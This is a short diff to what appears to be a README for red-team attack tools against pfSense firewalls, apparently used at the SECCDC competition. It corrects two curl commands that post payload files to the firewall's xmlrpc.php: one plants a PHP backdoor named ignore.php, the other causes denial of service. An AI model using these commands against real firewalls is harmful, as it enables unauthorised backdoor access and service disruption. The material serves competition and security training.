@@ -34,7 +34,7 @@ php backdoor named `ignore.php` to the webroot on the firewall.
 Using this payload against the pfSense xmlrpc.php file is a simple HTTP request using curl
 
 ```
-curl --data pfsense_exec http://10.10.100.1/xmlrpc.php
+curl --data @pfsense_exec http://10.10.100.1/xmlrpc.php
 ```
 
 ## The backdoor in use at SECCDC
@@ -59,7 +59,7 @@ administration will not function.
 Using this payload against the pfSense xmlrpc.php file is a simple HTTP request using curl
 
 ```
-curl --data pfsense_dos http://10.10.100.1/xmlrpc.php
+curl --data @pfsense_dos http://10.10.100.1/xmlrpc.php
 ```
 
 
